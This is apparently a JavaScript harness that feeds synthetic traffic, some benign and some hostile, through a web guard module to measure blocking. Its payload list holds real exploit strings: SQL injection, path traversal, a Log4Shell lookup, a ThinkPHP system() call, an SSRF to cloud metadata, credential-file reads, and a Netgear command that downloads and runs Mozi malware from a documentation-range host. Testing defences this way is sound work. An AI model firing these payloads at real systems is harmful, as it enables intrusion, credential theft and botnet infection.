// Synthetic traffic through Bulwark's real guard, into a scratch app. Documentation addresses only.
const S = await import(`${process.env.BULWARK_DIR || "../../../bulwark"}/sensor/burrow.mjs`);
const MIN = Number(process.env.MINUTES || 12);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let seed = 42; const rnd = () => ((seed = (seed * 16807) % 2147483647) / 2147483647);
const pick = (a) => a[(rnd() * a.length) | 0];
await S.start({ log: (...a) => console.log("[guard]", ...a), hostVersion: "2.39.0", domain: () => ({ mainHost: "aegis.example.com" }),
  history: () => ({}), devices: () => ({ list: [], addresses: {} }), notify: (n) => console.log("[notify]", n.title), kick: () => {} });
await sleep(1500);
const B = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15";
const C = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36";
const HOSTS = { grafana: ["grafana.example.com", 3000, "login"], termix: ["termix.example.com", 4300, "login"], blog: ["blog.example.com", 8080, "public"], files: ["files.example.com", 8090, "password"] };
const visitors = Array.from({ length: 14 }, (_, i) => [`2001:db8:${(0x10 + i).toString(16)}::${(i * 7 + 3).toString(16)}`, pick(["US", "DE", "GB", "NL", "CA", "FR", "SE"])]);
const attackers = [["203.0.113.66", "NL"], ["198.51.100.23", "US"], ["192.0.2.77", "SG"], ["203.0.113.140", "RU"], ["198.51.100.181", "CN"], ["192.0.2.201", "BR"], ["203.0.113.9", "DE"], ["198.51.100.44", "VN"]];
const PAY = ["/?id=1%27%20OR%20%271%27%3D%271", "/..%252f..%252f..%252fetc%252fpasswd", "/?x=%24%7Bjndi%3Aldap%3A%2F%2F198.51.100.7%2Fa%7D", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
  "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", "/?u=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F", "/?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E", "/actuator/env", "/alfa.php",
  "/boaform/admin/formLogin", "/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id", "/.git/config", "/.env", "/?n=%7B%7B7*7%7D%7D",
  "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://198.51.100.9/Mozi.m+-O+/tmp/netgear;sh+netgear", "/.aws/credentials", "/?file=php://filter/convert.base64-encode/resource=index.php"];
const OK = { grafana: ["/", "/api/dashboards/home", "/public/build/app.js", "/api/search?query=cpu", "/api/ds/query", "/d/node-exporter?refresh=5s", "/avatar/7f3a"],
  termix: ["/", "/assets/index.js", "/ws/terminal", "/api/hosts", "/api/settings"], blog: ["/", "/posts/2026/self-hosting-on-a-pi", "/feed.xml", "/img/cover.webp", "/about"], files: ["/", "/browse/photos", "/thumb/IMG_2041.jpg", "/api/list?path=/docs"] };
const WORDS = ["/admin", "/backup.zip", "/old", "/wp-admin/", "/phpmyadmin/", "/.svn/entries", "/server-status", "/config.json", "/debug", "/console", "/db.sql", "/test.php", "/info.php", "/api/v1/users", "/swagger.json", "/.DS_Store", "/cgi-bin/", "/login.php", "/manager/html", "/jenkins/"];
let n = 0, drops = 0;
function hit(ip, country, host, method, path, ua, status, bytes = 2400) {
  const [h, port, access] = HOSTS[host];
  const info = { t0: Date.now(), method, path, host: h, country, ua, referer: "", lang: "en-US", ray: "", proto: "2.0", via: "cloudflare", port, access, ipChecks: false, main: false, device: null, trusted: () => false };
  const g = S.guard(ip, info);
  const res = g ? { status: g.status || 404, bytes: 120, ms: 0 } : { status, bytes, ms: 8 + ((rnd() * 60) | 0) };
  if (g) drops++;
  S.observe(ip, info, res); n++;
  return g;
}
const t0 = Date.now(), end = t0 + MIN * 60e3;
const waveAt = t0 + MIN * 0.62 * 60e3, waveEnd = waveAt + 90e3;
console.log(`driving for ${MIN} min; wave at +${Math.round((waveAt - t0) / 1000)}s`);
while (Date.now() < end) {
  const now = Date.now();
  // people using their tunnels
  for (let i = 0; i < 3; i++) { const [ip, cc] = pick(visitors), host = pick(Object.keys(OK)); hit(ip, cc, host, pick(["GET", "GET", "GET", "POST"]), pick(OK[host]), pick([B, C]), 200, 1000 + ((rnd() * 90000) | 0)); }
  // scanners and exploit kits
  if (rnd() < 0.55) { const [ip, cc] = pick(attackers); hit(ip, cc, pick(Object.keys(HOSTS)), "GET", pick(PAY), pick([C, "python-requests/2.32", "Mozilla/5.0 zgrab/0.x", "curl/8.5.0"]), 404); }
  // wordlist scanning from one address now and then
  if (rnd() < 0.08) { const ip = `2001:db8:bad::${((rnd() * 4000) | 0).toString(16)}`; for (const w of WORDS.slice(0, 12 + ((rnd() * 8) | 0))) hit(ip, "CN", "blog", "GET", w, "Mozilla/5.0 (compatible; Nmap Scripting Engine)", 404, 300); }
  // someone hammering the files login
  if (rnd() < 0.05) { const ip = pick(["203.0.113.212", "198.51.100.99"]); for (let k = 0; k < 28; k++) hit(ip, "UA", "files", "POST", "/__gate/password", C, 401, 200); }
  // the wave: many addresses, one playbook
  if (now > waveAt && now < waveEnd) for (let k = 0; k < 6; k++) { const ip = `2001:db8:${(0xc00 + ((rnd() * 60) | 0)).toString(16)}::${((rnd() * 9000) | 0).toString(16)}`; hit(ip, pick(["US", "NL", "DE", "SG", "FR"]), pick(["blog", "grafana", "files"]), "GET", pick(["/.env", "/.git/config", "/.env.production", "/config/.env", "/.git/HEAD"]), "Mozilla/5.0 (l9scan/2.0)", 404, 200); }
  if ((n % 400) < 4) console.log(`${Math.round((now - t0) / 1000)}s: ${n} requests, ${drops} dropped`);
  await sleep(now > waveAt && now < waveEnd ? 250 : 700);
}
console.log(`done: ${n} requests, ${drops} dropped`);
await sleep(2000); S.stop(); process.exit(0);
